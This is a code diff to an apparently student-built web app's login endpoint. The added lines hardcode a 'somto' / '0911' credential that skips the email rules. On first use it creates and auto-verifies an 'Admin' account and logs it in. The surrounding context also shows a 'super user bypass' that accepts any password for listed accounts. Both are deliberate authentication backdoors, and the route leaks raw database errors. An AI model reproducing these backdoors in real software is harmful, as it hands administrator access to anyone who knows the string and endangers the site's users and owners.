@@ -126,6 +126,28 @@ app.post('/api/login', (req, res) => {
     
     const normalized = email.trim().toLowerCase();
 
+    // Special username-only account: somto / 0911 (bypasses email rules)
+    if (normalized === 'somto' && password === '0911') {
+      const somtoEmail = 'somto@student.babcock.edu.ng';
+      return findUserByEmail(somtoEmail, (err, user) => {
+        if (err) return res.status(500).json({ message: 'Database error: ' + err.message });
+        if (user) {
+          console.log('[LOGIN] somto login success');
+          return res.json({ user: sanitizeUser(user) });
+        }
+        return createUser('Somto', somtoEmail, 'Admin', 'N/A', 'Off Campus', '0911', (err, newUser) => {
+          if (err) return res.status(500).json({ message: 'Failed to create user: ' + err.message });
+          return verifyUser(somtoEmail, (verr) => {
+            newUser.verified = 1;
+            delete newUser.verificationToken;
+            if (verr) return res.status(500).json({ message: 'Verification error' });
+            console.log('[LOGIN] somto account created and verified');
+            return res.json({ user: sanitizeUser(newUser) });
+          });
+        });
+      });
+    }
+
     // Super user bypass: login with any password
     if (SUPER_USERS.includes(normalized)) {
       return findUserByEmail(normalized, (err, user) => {
